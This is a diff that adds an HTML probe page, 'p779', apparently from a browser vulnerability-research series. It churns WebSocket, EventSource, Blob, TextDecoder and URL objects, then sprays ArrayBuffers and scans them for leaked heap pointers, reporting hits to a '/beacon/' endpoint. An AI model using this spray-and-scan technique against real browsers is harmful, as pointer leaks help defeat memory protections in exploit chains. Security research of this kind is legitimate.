@@ -1,0 +1,382 @@
+<!--
+  p779: WebSocket / EventSource / Blob URL / URL.createObjectURL residue
+
+  WebSocket objects maintain a C++ WebSocketChannel with frame parser
+  state, send/receive buffers, and protocol negotiation data. Even a
+  failed connection attempt allocates the channel object and its
+  internal state machine. Creating many WebSocket objects to a
+  non-existent server and letting them fail exercises the allocator.
+
+  EventSource (Server-Sent Events) creates a C++ EventSource object
+  with an HTTP connection, line-based parser state, reconnection timer,
+  and event buffer. Failed connections still allocate the parser.
+
+  URL.createObjectURL(blob) registers a Blob URL in a C++ BlobRegistry
+  mapping. Each entry holds a reference to the Blob's backing store
+  and the URL string. Revoking with URL.revokeObjectURL frees the
+  registry entry but the Blob data may persist until GC.
+
+  Blob objects themselves have C++ BlobData backing with a vector of
+  BlobDataItem entries (inline data, file references, or other blob
+  references). Slicing creates new BlobData with sub-ranges.
+
+  TextEncoder/TextDecoder maintain C++ codec state. TextDecoder with
+  streaming mode ('stream: true') keeps partial decode state between
+  calls. Creating many decoders with different encodings exercises
+  the codec factory and state allocators.
+
+  Attack angles:
+  A) WebSocket failed connection churn then spray.
+  B) EventSource failed connection churn then spray.
+  C) Blob URL create/revoke registry churn.
+  D) Blob slice chain then GC + spray.
+  E) TextEncoder/TextDecoder codec state residue.
+  F) URL parsing internals (new URL() with complex URLs).
+
+  CRASH_CLASS: LOW (network objects fail gracefully, blob/url ops safe)
+  prior art: p772 (Fetch/ReadableStream), p776 (Performance/XHR)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p779</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p779-START');
+
+// === Section A: WebSocket failed connection churn ===
+try{
+  b('A-websocket');
+  var aHits=0;
+  var wsSupported=typeof WebSocket!=='undefined';
+
+  if(!wsSupported){
+    b('A-SKIP no WebSocket');
+  }else{
+    for(var round=0;round<3;round++){
+      (function(){
+        var sockets=[];
+        for(var i=0;i<50;i++){
+          try{
+            var ws=new WebSocket('ws://127.0.0.1:'+(30000+i+round*50)+'/path_'+round+'_'+i);
+            ws.onopen=function(){};
+            ws.onerror=function(){};
+            ws.onclose=function(){};
+            sockets.push(ws);
+          }catch(e){
+            if(i===0&&round===0)b('A ws_create_err='+e.message);
+          }
+        }
+
+        if(round===0)b('A created '+sockets.length+' websockets');
+
+        for(var i=0;i<sockets.length;i++){
+          try{sockets[i].close();}catch(e){}
+        }
+        sockets=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var SIZES=[64,96,128,192];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var szHits=0;
+        for(var i=0;i<200;i++){
+          var ab=new ArrayBuffer(sz);
+          var dv=new DataView(ab);
+          for(var off=0;off+8<=sz;off+=8){
+            if(isPtr(dv,off)){
+              szHits++;
+              if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+            }
+          }
+        }
+        aHits+=szHits;
+      }
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: EventSource failed connection churn ===
+try{
+  b('B-eventsource');
+  var bHits=0;
+  var esSupported=typeof EventSource!=='undefined';
+
+  if(!esSupported){
+    b('B-SKIP no EventSource');
+  }else{
+    for(var round=0;round<3;round++){
+      (function(){
+        var sources=[];
+        for(var i=0;i<30;i++){
+          try{
+            var es=new EventSource('/nonexistent_sse_'+round+'_'+i+'_'+'e'.repeat(30));
+            es.onerror=function(){};
+            es.onmessage=function(){};
+            sources.push(es);
+          }catch(e){
+            if(i===0&&round===0)b('B es_create_err='+e.message);
+          }
+        }
+
+        if(round===0)b('B created '+sources.length+' eventsources');
+
+        for(var i=0;i<sources.length;i++){
+          try{sources[i].close();}catch(e){}
+        }
+        sources=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var SIZES=[64,96,128,192];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var szHits=0;
+        for(var i=0;i<200;i++){
+          var ab=new ArrayBuffer(sz);
+          var dv=new DataView(ab);
+          for(var off=0;off+8<=sz;off+=8){
+            if(isPtr(dv,off)){
+              szHits++;
+              if(szHits<=2)b('B-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+            }
+          }
+        }
+        bHits+=szHits;
+      }
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: Blob URL create/revoke registry churn ===
+try{
+  b('C-blob-url');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var urls=[];
+      for(var i=0;i<100;i++){
+        var content='blob_content_'+round+'_'+i+'_'+'b'.repeat(50+i);
+        var blob=new Blob([content],{type:'text/plain'});
+        var url=URL.createObjectURL(blob);
+        urls.push(url);
+      }
+
+      if(round===0){
+        b('C created '+urls.length+' blob URLs');
+        b('C sample='+urls[0].substring(0,60));
+      }
+
+      for(var i=0;i<urls.length;i++){
+        URL.revokeObjectURL(urls[i]);
+      }
+      urls=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('C-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      cHits+=szHits;
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Blob slice chain then GC + spray ===
+try{
+  b('D-blob-slice');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var blobs=[];
+      var baseData='';
+      for(var i=0;i<200;i++)baseData+='slice_data_'+i+'_';
+      var base=new Blob([baseData],{type:'application/octet-stream'});
+
+      for(var i=0;i<100;i++){
+        var start=i*10;
+        var end=start+100+i;
+        var slice=base.slice(start,Math.min(end,base.size));
+        blobs.push(slice);
+
+        if(i>0&&i%10===0){
+          var combined=new Blob([blobs[i-1],blobs[i]],{type:'text/plain'});
+          blobs.push(combined);
+        }
+      }
+
+      if(round===0)b('D created '+blobs.length+' blob slices from base size='+base.size);
+      blobs=null;
+      base=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(96);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=96;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('D-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    dHits+=szHits;
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: TextEncoder/TextDecoder codec state ===
+try{
+  b('E-text-codec');
+  var eHits=0;
+  var tdSupported=typeof TextDecoder!=='undefined';
+
+  if(!tdSupported){
+    b('E-SKIP no TextDecoder');
+  }else{
+    var encodings=['utf-8','utf-16le','utf-16be','iso-8859-1','windows-1252',
+      'ascii','euc-jp','shift_jis','iso-2022-jp','euc-kr','gb2312','gbk','big5'];
+
+    for(var round=0;round<3;round++){
+      (function(){
+        var decoders=[];
+        for(var ei=0;ei<encodings.length;ei++){
+          for(var i=0;i<10;i++){
+            try{
+              var dec=new TextDecoder(encodings[ei],{fatal:false,ignoreBOM:true});
+
+              var chunk1=new Uint8Array(64);
+              for(var j=0;j<64;j++)chunk1[j]=(ei*10+i+j)&0xFF;
+              dec.decode(chunk1,{stream:true});
+
+              var chunk2=new Uint8Array(32);
+              for(var j=0;j<32;j++)chunk2[j]=(ei*20+i*3+j)&0xFF;
+              dec.decode(chunk2,{stream:true});
+
+              dec.decode(new Uint8Array(0));
+              decoders.push(dec);
+            }catch(e){
+              if(ei===0&&i===0&&round===0)b('E decode_err='+encodings[ei]+' '+e.message);
+            }
+          }
+        }
+
+        if(round===0)b('E created '+decoders.length+' decoders across '+encodings.length+' encodings');
+
+        var encoder=new TextEncoder();
+        for(var i=0;i<100;i++){
+          var text='encode_test_'+round+'_'+i+'_'+'u'.repeat(50);
+          var encoded=encoder.encode(text);
+        }
+
+        decoders=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var SIZES=[32,48,64,96];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var szHits=0;
+        for(var i=0;i<200;i++){
+          var ab=new ArrayBuffer(sz);
+          var dv=new DataView(ab);
+          for(var off=0;off+8<=sz;off+=8){
+            if(isPtr(dv,off)){
+              szHits++;
+              if(szHits<=2)b('E-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+            }
+          }
+        }
+        eHits+=szHits;
+      }
+    }
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: URL parsing internals ===
+try{
+  b('F-url-parsing');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var urls=[];
+      for(var i=0;i<200;i++){
+        try{
+          var complex='https://user'+i+':pass'+round+'@sub'+i+'.example.com:'+
+            (8000+i)+'/path/'+round+'/'+i+'/deep/nested/resource_'+'r'.repeat(20+i%30)+
+            '?query='+i+'&round='+round+'&param='+'p'.repeat(20)+'&arr[]=1&arr[]=2'+
+            '#fragment_'+i+'_'+'f'.repeat(10);
+          var u=new URL(complex);
+          urls.push(u);
+        }catch(e){}
+      }
+
+      if(round===0&&urls.length>0){
+        b('F created '+urls.length+' URL objects');
+        b('F sample host='+urls[0].host+' pathname='+urls[0].pathname.substring(0,40));
+      }
+      urls=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('F-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      fHits+=szHits;
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p779-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
